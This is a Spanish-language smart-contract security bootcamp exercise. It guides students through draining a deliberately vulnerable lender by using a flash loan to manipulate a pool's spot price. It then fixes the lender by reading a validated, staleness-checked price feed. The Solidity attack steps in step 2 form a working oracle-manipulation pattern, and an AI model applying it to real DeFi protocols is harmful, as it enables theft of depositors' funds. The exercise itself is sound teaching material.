# Ejercicio 01 — Oráculo y flash loan

> Al terminar habrás vaciado un prestamista que valora su colateral con el precio de un pool,
> sin un solo token propio: con un flash loan. Y lo habrás corregido leyendo el precio de un
> price feed.

**Duración estimada**: 2 h
**Prerrequisitos**: [Teoría 01 — Manipulación de oráculos](../../1-teoria/01-manipulacion-de-oraculos.md)
y [Teoría 02 — Flash loans](../../1-teoria/02-flash-loans.md) leídas.

## Contexto

Proyecto Foundry con dos tokens de 18 decimales, USD y GOV, y un pool que los cambia. En los
tests, el pool empieza con 1 000 000 USD y 1000 GOV (1 GOV vale 1000 USD), y cada prestamista
tiene 2 000 000 USD para prestar. El price feed falso de la semana 20 dice lo mismo: 1000 USD.

| Archivo | Qué es |
| ------- | ------ |
| `src/Token.sol` | ERC-20 con flash loans (`ERC20FlashMint`) y una comisión del 0,1 %. Hecho |
| `src/Pool.sol` | Pool de producto constante. Paso 1 |
| `src/Lender.sol` | El prestamista: presta USD hasta el 80 % del valor del GOV que dejas. Hecho |
| `src/SpotLender.sol` | El blanco: valora el GOV con el pool. **No lo arregles** |
| `src/FlashAttacker.sol` | El atacante. Pasos 2 y 3 |
| `src/FeedLender.sol` | El prestamista corregido. Paso 4 |
| `test/OracleFlashLoan.t.sol` | Los tests. **No lo modifiques** |

## Paso 0: Entrar y ver el rojo

```bash
cd bootcamp/week-22-vulnerabilidades_economicas/2-practicas/ejercicio-01-oraculo-y-flash-loan/starter
docker run --rm -it -v "$PWD":/workspace bc-smartcontracts-dev
forge test
```

**Verifica**: `0 passed; 7 failed`, todos con un `TODO`. La compilación avisa de código
inalcanzable y de parámetros sin usar: son los `revert` de los pasos y desaparecen al
resolverlos.

## Paso 1: El precio al contado

**Por qué**: es el precio que `SpotLender` va a creer. Sale de las reservas: cuántos USD hay por
cada GOV. Se multiplica por `1e18` antes de dividir para no perder los 18 decimales (teoría 04).

```solidity
return reserveUsd * 1e18 / reserveGov;
```

**Abre** `src/Pool.sol`, borra el `revert` de `spotPrice` y descomenta su línea. Ejecuta
`forge test`.

**Verifica**: `1 passed; 6 failed`, con `test_Paso1_SpotPrice` en verde: el precio empieza en
`1000e18` y, tras un swap de 1 000 000 USD que saca 500 GOV, es `4000e18`. Un solo swap lo ha
multiplicado por cuatro.

## Paso 2: El ataque

**Por qué**: el atacante no tiene nada. Pide 1 000 000 USD al token con `flashLoan`, y el token
llama a su `onFlashLoan` con el dinero ya en su saldo. Ahí hace los tres pasos de la teoría 01:
compra GOV (el precio sube a 4000), los deja de colateral y pide todo lo que `SpotLender` le
deja con ese precio. Al final da permiso al token para quemar el préstamo y la comisión.

```solidity
IERC20(USD).forceApprove(address(POOL), amount);
uint256 gov = POOL.swap(USD, amount);
GOV.forceApprove(address(LENDER), gov);
LENDER.borrow(gov, LENDER.maxDebt(gov));
// El token cobra quemando `amount + fee` de este contrato: necesita la allowance.
IERC20(USD).forceApprove(address(USD), amount + fee);
return CALLBACK_SUCCESS;
```

**Abre** `src/FlashAttacker.sol`, borra el `revert` de `onFlashLoan` y descomenta las líneas
del paso 2. Deja comentadas las del paso 3.

**Verifica**: `2 passed; 5 failed`. `test_Paso2_FlashLoanDrainsSpotLender` en verde: Mallory
empieza con 0 USD y acaba con **599 000**. `SpotLender` prestó 1 600 000 contra 500 GOV que, al
precio real, valen 500 000. El `totalSupply` de USD acaba 1000 por debajo del inicial: el
préstamo se creó y se quemó, y la comisión también se quemó.

Mira la traza con `forge test --mt test_Paso2 -vvvv`: todo el ataque está dentro de la llamada
a `flashLoan`.

Los dos tests del paso 3 fallan con `ERC20InsufficientBalance`: un extraño ha conseguido que tu
atacante ejecute su lógica con un préstamo que pidió él. Esta vez no le salen las cuentas y
revierte, pero tu contrato ha hecho lo que otro quería.

## Paso 3: Fiarse solo de quien debe

**Por qué**: `onFlashLoan` es `external`. Cualquiera puede llamarla fingiendo ser el token, y
cualquiera puede llamar a `flashLoan` del token poniendo tu contrato de `receiver`. Las dos
comprobaciones de la teoría 02 cierran esas puertas.

```solidity
if (msg.sender != address(USD)) revert UntrustedLender(msg.sender);
if (initiator != address(this)) revert UntrustedInitiator(initiator);
```

**Abre** `src/FlashAttacker.sol` y descomenta las dos líneas del paso 3.

**Verifica**: `4 passed; 3 failed`. En verde:

- `test_Paso3_RevertWhen_CallerIsNotLender`: un extraño que llama a `onFlashLoan` recibe
  `UntrustedLender(extraño)`.
- `test_Paso3_RevertWhen_UntrustedInitiator`: un extraño que pide un flash loan para tu atacante
  recibe `UntrustedInitiator(extraño)`.

## Paso 4: Un precio que no se compra

**Por qué**: el fallo no está en el atacante sino en de dónde saca `SpotLender` el precio.
`FeedLender` lo lee de un price feed, con las comprobaciones de la semana 20, y lo lleva de los
8 decimales del feed a los 18 de los tokens multiplicando por `10 ** (18 - 8)`.

```solidity
// forge-lint: disable-next-line(unused-return)
(, int256 answer,, uint256 updatedAt,) = FEED.latestRoundData();
if (answer <= 0) revert InvalidPrice(answer);
// forge-lint: disable-next-line(block-timestamp)
if (block.timestamp - updatedAt > MAX_PRICE_AGE) revert StalePrice(updatedAt);
// `answer` ya es positivo: la conversión no cambia su valor.
// forge-lint: disable-next-line(unsafe-typecast)
return uint256(answer) * 10 ** (18 - FEED.decimals());
```

**Abre** `src/FeedLender.sol`, borra el `revert` de `price` y descomenta sus líneas.

**Verifica**: `7 passed`. En verde:

- `test_Paso4_FeedPrice`: `1000e18`; con `-1` revierte `InvalidPrice(-1)`, y una hora y un
  segundo después de la última actualización, `StalePrice`.
- `test_Paso4_RevertWhen_AttackingFeedLender`: el mismo ataque compra los mismos 500 GOV, pero
  `FeedLender` los valora a 1000 y presta 400 000. Al devolver, el token quiere quemar
  1 001 000 y el atacante tiene 400 000: `ERC20InsufficientBalance(atacante, 400000e18,
  1001000e18)`, y la transacción entera se deshace.
- `test_Paso4_HonestBorrow`: con 10 GOV, Alice puede deber 8000 USD, y 8001 da
  `TooMuchDebt(8001e18, 8000e18)`.

Para terminar, comprueba que no queda ningún warning:

```bash
forge test --deny warnings
```

## Para pensar

- El pool del paso 1 se queda con el precio a 4000 después del ataque. ¿Qué haría un
  arbitrajista en el bloque siguiente, y por qué eso no salva al prestamista?
- `SpotLender` presta el 80 %. ¿Qué parte del precio tendría que mover el atacante para ganar
  si prestara solo el 25 %? (Pista: necesita que lo prestado supere lo que pagó por el GOV.)
- `FeedLender` también se puede atacar si el feed se para una hora. ¿Qué pasa con sus deudas
  si el precio real de GOV cae a la mitad durante esa hora?

---

| Anterior | Actual | Siguiente |
| -------- | ------ | --------- |
| [← Teoría 04 — Redondeo](../../1-teoria/04-redondeo.md) | **Ejercicio 01 — Oráculo y flash loan** | [Ejercicio 02 — Front-running y MEV →](../ejercicio-02-front-running-y-mev/README.md) |
